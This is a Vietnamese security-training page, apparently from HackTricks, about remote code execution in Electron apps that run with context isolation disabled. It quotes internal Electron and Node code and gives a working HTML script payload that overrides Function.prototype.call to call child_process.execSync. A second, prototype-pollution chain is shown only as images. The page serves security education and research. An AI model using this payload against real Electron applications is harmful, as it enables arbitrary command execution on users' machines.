# RCE trong Electron qua mã nội bộ khi tắt context isolation

{{#include ../../banners/hacktricks-training.md}}

Đây là **các mẫu khai thác mang tính lịch sử** dành cho những ứng dụng Electron chạy nội dung renderer không đáng tin cậy mà không bật context isolation. Context isolation được bật mặc định kể từ Electron 12 và vẫn là một thiết lập bảo mật được khuyến nghị.<sup>[[1]](#references)</sup> Các chi tiết nội bộ chính xác khác nhau tùy phiên bản Electron và Node.js, vì vậy hãy tái hiện chuỗi khai thác bằng các phiên bản được đóng gói trong ứng dụng mục tiêu.

## Ví dụ 1: ghi đè `Function.prototype.call`

Ví dụ này được trích từ bài thuyết trình CureCon của Masato Kinugawa.<sup>[[2]](#references)</sup>

Trong bản dựng Electron cũ bị ảnh hưởng, mã ASAR nội bộ đăng ký một listener cho sự kiện `exit` của process. Vì mã trang và mã nội bộ của Electron dùng chung các prototype JavaScript khi context isolation bị tắt, mã renderer có thể thay thế `Function.prototype.call` trước khi listener nội bộ chạy.<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```javascript
process.on("exit", function () {
  for (let p in cachedArchives) {
    if (!hasProp.call(cachedArchives, p)) continue
    cachedArchives[p].destroy()
  }
})
```

![Đường dẫn mã nội bộ asar.js của Electron được dùng trong ví dụ contextIsolation RCE](<../../images/image (1070).png>)

Listener được dispatch thông qua cơ chế event của Node.js. Trang gốc liên kết đến đường dẫn `bin/events.js` đã cũ; mã nguồn còn hoạt động trong cùng commit lịch sử nằm tại `lib/events.js`.<sup>[[5]](#references)</sup>

![Đường dẫn mã events.js của Node được truy cập trong chuỗi Electron contextIsolation RCE](<../../images/image (793).png>)

Trong đường dẫn này, `self` là đối tượng process của Node.js:

![Electron contextIsolation RCE qua mã nội bộ của Electron - Ví dụ 1: `self` là đối tượng process của Node](<../../images/image (700).png>)

Đối tượng process trong lịch sử cung cấp một đường dẫn đến `require`:

```
process.mainModule.require
```

Vì listener dispatcher gọi handler với process object, việc ghi đè `call` có thể lấy lại object đó và thực thi lệnh native:

```html
<script>
  Function.prototype.call = function (process) {
    process.mainModule.require("child_process").execSync("calc")
  }
  location.reload() // Trigger the listener during navigation
</script>
```

## Ví dụ 2: prototype pollution

Bài thuyết trình ElectroVolt minh họa một chuỗi khai thác khác trong quá khứ, lấy được đối tượng `require` thông qua prototype pollution.<sup>[[4]](#references)</sup>

Leak:

<figure><img src="../../images/image (279).png" alt=""><figcaption></figcaption></figure>

Exploit:

<figure><img src="../../images/image (89).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Tài liệu Electron - Cách ly ngữ cảnh](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [2] [Electron: Lợi dụng việc thiếu cách ly ngữ cảnh - CureCon](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41)
- [3] [Mã nguồn lịch sử của Electron - lib/common/asar.js](https://github.com/electron/electron/blob/664c184fcb98bb5b4b6b569553e7f7339d3ba4c5/lib/common/asar.js#L30-L36)
- [4] [ElectroVolt: Pwning các ứng dụng desktop phổ biến trong khi khám phá bề mặt tấn công mới trên Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [5] [Mã nguồn lịch sử của Node.js - `lib/events.js` điều phối listener](https://github.com/nodejs/node/blob/8a44289089a08b7b19fa3c4651b5f1f5d1edd71b/lib/events.js#L156-L231)
{{#include ../../banners/hacktricks-training.md}}
